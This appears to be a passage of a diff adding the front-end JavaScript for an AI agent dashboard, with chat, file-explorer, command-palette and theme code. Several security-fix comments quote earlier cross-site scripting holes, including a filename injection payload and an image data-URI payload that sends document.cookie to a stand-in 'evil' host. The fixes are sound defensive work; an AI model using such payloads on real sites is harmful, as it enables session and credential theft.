+    ['bl-uptime', 'bl-db', 'bl-wal', 'bl-embmodel', 'bl-vectors', 'bl-locks'].forEach(id => setText(id, '—'));
+  }
+
+  // Badge summarises the panel: healthy, reachable-but-sick, or unreachable.
+  const firstErr = healthErr || statsErr;
+  if (!firstErr && health && health.status === 'ok') {
+    setBrainBadge('ok', 'online');
+  } else if (firstErr && firstErr.kind === 'degraded') {
+    setBrainBadge('warn', 'degraded');
+  } else if (firstErr && firstErr.kind === 'offline') {
+    setBrainBadge('err', 'offline');
+  } else {
+    setBrainBadge('warn', firstErr ? errLabel(firstErr) : 'unknown');
+  }
+}
+
+// ═══════════ CHAT ═══════════
+function setupInput() {
+  const inp = document.getElementById('msginp');
+  inp.addEventListener('keydown', e => {
+    if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+      e.preventDefault();
+      sendMsg();
+    }
+  });
+  inp.addEventListener('input', () => {
+    inp.style.height = 'auto';
+    inp.style.height = Math.min(inp.scrollHeight, 120) + 'px';
+  });
+}
+
+function setupKeyboard() {
+  document.addEventListener('keydown', e => {
+    if (e.key === 'k' && (e.ctrlKey || e.metaKey)) {
+      e.preventDefault();
+      openCmdPalette();
+    }
+    if (e.key === 'b' && (e.ctrlKey || e.metaKey)) {
+      e.preventDefault();
+      toggleSidebar();
+    }
+    if (e.key === '.' && (e.ctrlKey || e.metaKey)) {
+      e.preventDefault();
+      toggleRight();
+    }
+    if (e.key === 'n' && (e.ctrlKey || e.metaKey)) {
+      e.preventDefault();
+      newConv();
+    }
+    if (e.key === 'Escape') {
+      closeFileViewer();
+      closeCmdPalette();
+      document.getElementById('top-overflow-menu').classList.remove('open');
+    }
+  });
+}
+
+async function sendMsg() {
+  const inp = document.getElementById('msginp');
+  const text = inp.value.trim();
+  if (!text || streaming) return;
+
+  appendMsg('u', text);
+  inp.value = '';
+  inp.style.height = 'auto';
+  setDot('act');
+  streaming = true;
+  document.getElementById('stop-btn').style.display = '';
+  document.getElementById('run-btn').style.display = 'none';
+  document.getElementById('sbtn').disabled = true;
+
+  // Everything from here on is wrapped, and the UI reset lives in `finally`.
+  // Previously the message-save fetch below sat outside any try/catch: a single
+  // network blip threw past the reset block, so `streaming` stayed true, Stop
+  // stayed visible, Run stayed hidden and #sbtn stayed disabled. The composer
+  // was then wedged until a full page reload.
+  try {
+    // Create conversation if needed
+    if (!convId) {
+      try {
+        const created = await apiJson(API + '/api/conversations', { method: 'POST' });
+        convId = created.id;
+      } catch { /* non-fatal: continue without a conversation record */ }
+    }
+
+    // Save user message. Non-fatal — losing the transcript row must not stop
+    // the goal from being dispatched.
+    if (convId) {
+      try {
+        await apiFetch(API + '/api/conversations/' + convId + '/messages', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ role: 'user', content: text }),
+        });
+      } catch (exc) {
+        appendMsg('e', 'Could not save message to history (' + errLabel(exc) + ')');
+      }
+    }
+
+    // Call the goal endpoint
+    abort = new AbortController();
+    try {
+      await apiFetch(API + '/goal', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ goal: text }),
+        signal: abort.signal,
+        timeoutMs: 30000,
+      });
+      appendMsg('a', 'Agent is working on your request…');
+    } catch (exc) {
+      if (exc.name !== 'AbortError' && !(abort && abort.signal.aborted)) {
+        appendMsg('e', 'Failed to start agent: ' + errLabel(exc));
+      }
+    }
+  } finally {
+    streaming = false;
+    setDot('ok');
+    document.getElementById('stop-btn').style.display = 'none';
+    document.getElementById('run-btn').style.display = '';
+    document.getElementById('sbtn').disabled = false;
+  }
+}
+
+// Roles: 'u' user, 'a' assistant, 's' system notice, 'e' error.
+// v8 mapped every role that was not 'u' or 's' onto assistant styling, so the
+// 'e' errors raised by sendMsg rendered as if the model had said them.
+const MSG_CLASS = { u: 'u', a: 'a', s: 's', e: 'e' };
+const MSG_AVATAR = { u: '👤', a: '🤖', s: '⚙', e: '⚠' };
+
+function appendMsg(role, text) {
+  const msgs = document.getElementById('msgs');
+  const div = document.createElement('div');
+  div.className = 'msg ' + (MSG_CLASS[role] || 'a');
+  div.innerHTML = `<div class="mav">${MSG_AVATAR[role] || '🤖'}</div><div class="mb">${escHtml(text)}</div>`;
+  msgs.appendChild(div);
+
+  // Bound the transcript. Without this, #msgs grew without limit — every
+  // appendMsg call and every inbound WebSocket message added a node forever,
+  // which is what made long agent sessions turn sluggish.
+  while (msgs.childElementCount > MAX_MESSAGES) {
+    msgs.removeChild(msgs.firstElementChild);
+  }
+
+  msgs.scrollTop = msgs.scrollHeight;
+}
+
+function stopStream() {
+  if (abort) abort.abort();
+  streaming = false;
+  setDot('ok');
+  document.getElementById('stop-btn').style.display = 'none';
+  document.getElementById('run-btn').style.display = '';
+}
+
+function newConv() {
+  convId = null;
+  document.getElementById('msgs').innerHTML = '<div class="msg s"><div class="mb">New conversation started</div></div>';
+  document.querySelectorAll('.conv-item').forEach(i => i.classList.remove('on'));
+  toast('New conversation', 'ok');
+}
+
+// ═══════════ FILE EXPLORER ═══════════
+const FILE_ICONS = {
+  dir: '📁',
+  py: '🐍', js: '📜', ts: '📘', json: '📋', yaml: '📄', yml: '📄',
+  md: '📝', txt: '📄', log: '📃', csv: '📊', html: '🌐', css: '🎨',
+  jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', bmp: '🖼️', svg: '🖼️',
+  mp4: '🎬', mp3: '🎵', zip: '📦', rar: '📦', '7z': '📦',
+  exe: '⚙️', dll: '🔧', bat: '⌨️', ps1: '💻',
+  default: '📄'
+};
+
+function getFileIcon(name, isDir) {
+  if (isDir) return FILE_ICONS.dir;
+  const ext = name.split('.').pop()?.toLowerCase() || '';
+  return FILE_ICONS[ext] || FILE_ICONS.default;
+}
+
+// formatSize() was folded into the null-safe formatBytes() above; there is now
+// one byte formatter for the whole dashboard.
+
+async function loadFiles(path) {
+  const tree = document.getElementById('fe-tree');
+  tree.innerHTML = '<div class="fe-entry" style="color:var(--muted)"><span class="fe-entry-icon">⏳</span><span class="fe-entry-name">Loading…</span></div>';
+
+  try {
+    const data = await apiJson(API + '/api/files?path=' + encodeURIComponent(path));
+    renderFileTree(data.entries || [], tree);
+  } catch (exc) {
+    // Say which kind of failure it was, rather than a blank or generic panel.
+    tree.textContent = '';
+    const msg = document.createElement('div');
+    msg.className = 'fe-entry';
+    msg.style.color = exc.kind === 'degraded' ? 'var(--warn)' : 'var(--err)';
+    msg.textContent = exc.kind === 'degraded'
+      ? '⚠ File service degraded: ' + exc.message
+      : '⚠ Cannot list directory (' + errLabel(exc) + ')';
+    tree.appendChild(msg);
+  }
+}
+
+function renderFileTree(entries, container) {
+  container.innerHTML = '';
+  if (entries.length === 0) {
+    container.innerHTML = '<div class="fe-entry" style="color:var(--muted);font-style:italic"><span class="fe-entry-icon">📭</span><span class="fe-entry-name">Empty directory</span></div>';
+    return;
+  }
+
+  const sorted = entries.sort((a, b) => {
+    if (a.type === 'dir' && b.type !== 'dir') return -1;
+    if (a.type !== 'dir' && b.type === 'dir') return 1;
+    return a.name.localeCompare(b.name);
+  });
+
+  sorted.forEach(entry => {
+    // Resolve once, use the raw value in closures. `'`, `"` and backtick are all
+    // legal in Windows filenames, and these names come from the file-listing
+    // API, so this is the most reachable injection surface in the dashboard.
+    const fullPath = entry.path || (currentPath + '\\' + entry.name);
+
+    const div = document.createElement('div');
+    div.className = 'fe-dir';
+    // Attribute values are escaped AND quoted. The action buttons no longer
+    // carry the path at all: v8 wrote onclick="viewFile('${esc(path)}')", and
+    // because esc() did not touch `'`, a file named `x'); alert(1);//` escaped
+    // the string literal and ran as JavaScript on render.
+    div.innerHTML = `
+      <div class="fe-entry" data-path="${escAttr(fullPath)}" data-type="${escAttr(entry.type)}" data-name="${escAttr(entry.name)}">
+        <span class="fe-dir-toggle">${entry.type === 'dir' ? '▼' : ''}</span>
+        <span class="fe-entry-icon">${escHtml(getFileIcon(entry.name, entry.type === 'dir'))}</span>
+        <span class="fe-entry-name">${escHtml(entry.name)}</span>
+        <span class="fe-entry-size">${entry.size != null && entry.type !== 'dir' ? escHtml(formatBytes(entry.size)) : ''}</span>
+        <div class="fe-entry-actions">
+          ${entry.type !== 'dir' ? `
+            <button class="fe-action-btn" data-act="view" title="View">👁</button>
+            <button class="fe-action-btn" data-act="copy" title="Copy path">📋</button>
+            <button class="fe-action-btn" data-act="download" title="Download">⬇</button>
+          ` : ''}
+        </div>
+      </div>
+      <div class="fe-dir-children" style="display:none"></div>
+    `;
+
+    const entryEl = div.querySelector('.fe-entry');
+    const childrenEl = div.querySelector('.fe-dir-children');
+
+    const actions = { view: viewFile, copy: copyPath, download: downloadFile };
+    div.querySelectorAll('.fe-action-btn').forEach(btn => {
+      btn.addEventListener('click', e => {
+        e.stopPropagation();
+        const fn = actions[btn.dataset.act];
+        if (fn) fn(fullPath);
+      });
+    });
+
+    if (entry.type === 'dir') {
+      entryEl.addEventListener('click', async () => {
+        const isCollapsed = div.classList.toggle('collapsed');
+        if (!isCollapsed && childrenEl.style.display === 'none') {
+          childrenEl.style.display = 'block';
+          try {
+            const data = await apiJson(API + '/api/files?path=' + encodeURIComponent(fullPath));
+            renderFileTree(data.entries || [], childrenEl);
+          } catch (exc) {
+            childrenEl.textContent = '';
+            const msg = document.createElement('div');
+            msg.className = 'fe-entry';
+            msg.style.color = 'var(--err)';
+            msg.textContent = '⚠ ' + (exc.kind === 'degraded' ? 'Service degraded' : 'Access denied');
+            childrenEl.appendChild(msg);
+          }
+        } else {
+          childrenEl.style.display = isCollapsed ? 'none' : 'block';
+        }
+      });
+    }
+
+    container.appendChild(div);
+  });
+}
+
+async function viewFile(path) {
+  const viewer = document.getElementById('file-viewer');
+  const title = document.getElementById('fv-title');
+  const body = document.getElementById('fv-body');
+  title.textContent = path.split('\\').pop();
+  body.innerHTML = '<div style="color:var(--muted)">Loading…</div>';
+  viewer.classList.add('open');
+
+  try {
+    const data = await apiJson(API + '/api/files/content?path=' + encodeURIComponent(path) + '&max_bytes=1048576', { timeoutMs: 15000 });
+    if (data.is_image) {
+      // v8 did: body.innerHTML = `<img src="${data.data_uri}" alt="${esc(path)}">`
+      // with NO escaping on data_uri at all, straight from the file-content API.
+      // A value of `x" onerror="fetch('//evil/'+document.cookie)` closed the src
+      // attribute and injected an event handler. Two independent fixes now:
+      //   1. the value must match a base64 raster-image data: URI (no svg+xml)
+      //   2. it is assigned through the DOM, so there is no HTML string to break
+      body.textContent = '';
+      if (isSafeImageDataUri(data.data_uri)) {
+        const img = document.createElement('img');
+        img.src = data.data_uri;
+        img.alt = path;
+        body.appendChild(img);
+      } else {
+        const warn = document.createElement('div');
+        warn.style.color = 'var(--err)';
+        warn.textContent = 'Refused to render image: the API returned a data URI that is not a recognised base64 raster image.';
+        body.appendChild(warn);
+      }
+    } else if (data.truncated) {
+      body.textContent = data.content + '\n\n--- Content truncated (file too large) ---';
+    } else {
+      body.textContent = data.content;
+    }
+  } catch (exc) {
+    body.textContent = '';
+    const msg = document.createElement('div');
+    msg.style.color = exc.kind === 'degraded' ? 'var(--warn)' : 'var(--err)';
+    msg.textContent = 'Failed to load file (' + errLabel(exc) + ')';
+    body.appendChild(msg);
+  }
+}
+
+function copyPath(path) {
+  navigator.clipboard.writeText(path).then(() => toast('Path copied', 'ok'));
+}
+
+async function copyFileContent(path) {
+  try {
+    const data = await apiJson(API + '/api/files/content?path=' + encodeURIComponent(path) + '&max_bytes=1048576', { timeoutMs: 15000 });
+    await navigator.clipboard.writeText(data.content);
+    toast('Content copied to clipboard', 'ok');
+  } catch (exc) {
+    toast('Failed to copy content (' + errLabel(exc) + ')', 'err');
+  }
+}
+
+function downloadFile(path) {
+  window.open(API + '/api/files/download?path=' + encodeURIComponent(path), '_blank');
+}
+
+function navigateTo(path) {
+  currentPath = path;
+  updateBreadcrumb(path);
+  loadFiles(path);
+}
+
+// Built through the DOM with listeners. v8 interpolated each accumulated path
+// into onclick="navigateTo('...')" via esc(), which left `'` intact — and the
+// path segments here derive from directory names, so they are untrusted too.
+function updateBreadcrumb(path) {
+  const bc = document.getElementById('fe-breadcrumb');
+  bc.textContent = '';
+
+  const addCrumb = (label, target) => {
+    const span = document.createElement('span');
+    span.className = 'bc-item';
+    span.textContent = label;
+    span.addEventListener('click', () => navigateTo(target));
+    bc.appendChild(span);
+  };
+  const addSep = () => {
+    const sep = document.createElement('span');
+    sep.className = 'bc-sep';
+    sep.textContent = '›';
+    bc.appendChild(sep);
+  };
+
+  addCrumb('C:', 'C:\\');
+  let buildPath = 'C:';
+  path.split('\\').filter(Boolean).forEach((p, i) => {
+    // The first segment is the drive letter already rendered as the root crumb.
+    if (i === 0 && /^[A-Za-z]:$/.test(p)) return;
+    buildPath += '\\' + p;
+    addSep();
+    addCrumb(p, buildPath);
+  });
+}
+
+function closeFileViewer() {
+  document.getElementById('file-viewer').classList.remove('open');
+}
+
+// ═══════════ COMMAND PALETTE ═══════════
+function openCmdPalette() {
+  const palette = document.getElementById('cmd-palette');
+  palette.classList.add('open');
+  const input = document.getElementById('cmd-input');
+  input.value = '';
+  input.focus();
+  renderCmdResults('');
+  input.oninput = () => renderCmdResults(input.value);
+}
+
+function closeCmdPalette() {
+  document.getElementById('cmd-palette').classList.remove('open');
+}
+
+function renderCmdResults(query) {
+  const cmds = [
+    { name: 'New Chat', key: 'Ctrl+N', action: () => { closeCmdPalette(); newConv(); } },
+    { name: 'Toggle Sidebar', key: 'Ctrl+B', action: () => { closeCmdPalette(); toggleSidebar(); } },
+    { name: 'Toggle Files', key: 'Ctrl+.', action: () => { closeCmdPalette(); toggleRight(); } },
+    { name: 'Switch Theme', key: '', action: () => { closeCmdPalette(); toggleTheme(); } },
+    { name: 'Export Log', key: '', action: () => { closeCmdPalette(); exportLog(); } },
+    { name: 'Screenshot', key: '', action: () => { closeCmdPalette(); takeScreenshot(); } },
+  ];
+  const q = query.toLowerCase();
+  const filtered = cmds.filter(c => c.name.toLowerCase().includes(q));
+  const results = document.getElementById('cmd-results');
+
+  // v8 stringified each action function into an inline onclick and re-parsed it
+  // as code on every keystroke. The commands are hardcoded so it was not
+  // directly exploitable, but it made the whole page require 'unsafe-inline'
+  // script for no benefit. Bind the real function objects instead.
+  results.textContent = '';
+  filtered.forEach(c => {
+    const item = document.createElement('div');
+    item.className = 'cmd-item';
+
+    const name = document.createElement('span');
+    name.textContent = c.name;
+    item.appendChild(name);
+
+    if (c.key) {
+      const key = document.createElement('span');
+      key.className = 'cmd-item-key';
+      key.textContent = c.key;
+      item.appendChild(key);
+    }
+
+    item.addEventListener('click', c.action);
+    results.appendChild(item);
+  });
+}
+
+// ═══════════ THEMES ═══════════
+const THEMES = ['sentinel', 'matrix', 'tron', 'blood', 'ember', 'frost', 'phantom', 'neon', 'terminal', 'midnight', 'cyberpunk', 'solar', 'arctic'];
+let currentTheme = localStorage.getItem('dash8-theme') || 'sentinel';
+
+function applyTheme(theme) {
+  currentTheme = theme;
+  if (theme === 'sentinel') {
+    document.documentElement.removeAttribute('data-theme');
+  } else {
+    document.documentElement.setAttribute('data-theme', theme);
+  }
+  localStorage.setItem('dash8-theme', theme);
+}
+
+function toggleTheme() {
+  const idx = THEMES.indexOf(currentTheme);
+  const next = THEMES[(idx + 1) % THEMES.length];
+  applyTheme(next);
+  toast(`Theme: ${next}`, 'ok');
+}
+
+applyTheme(currentTheme);
+
+// ═══════════ UTILITIES ═══════════
+// The old esc() lived here:
+//     function esc(str) { const d = document.createElement('div');
+//                         d.textContent = str; return d.innerHTML; }
+// Per the HTML serialisation spec that escapes only `&`, `<` and `>` in text
+// position — never `"`, `'` or backtick. It was nevertheless used inside
+// double-quoted HTML attributes and inside single-quoted JS string literals in
+// onclick handlers, where it neutralised nothing. Replaced by escHtml/escAttr
+// above, and every JS-code-context call site was converted to addEventListener.
+
+function toast(msg, type = '') {
+  const container = document.getElementById('toast-container');
+  const t = document.createElement('div');
+  t.className = 'toast ' + type;
+  t.textContent = msg;
+  container.appendChild(t);
+  setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 300); }, 3000);
+}
+
+function exportLog() {
+  toast('Log exported (Phase 5)', 'ok');
+}
+
+function takeScreenshot() {
+  toast('Screenshot captured (Phase 5)', 'ok');
+}
+
+function onFileInput(input) {
+  toast(`${input.files.length} file(s) attached (Phase 5)`, 'ok');
+}
+</script>
+</body>
+</html>
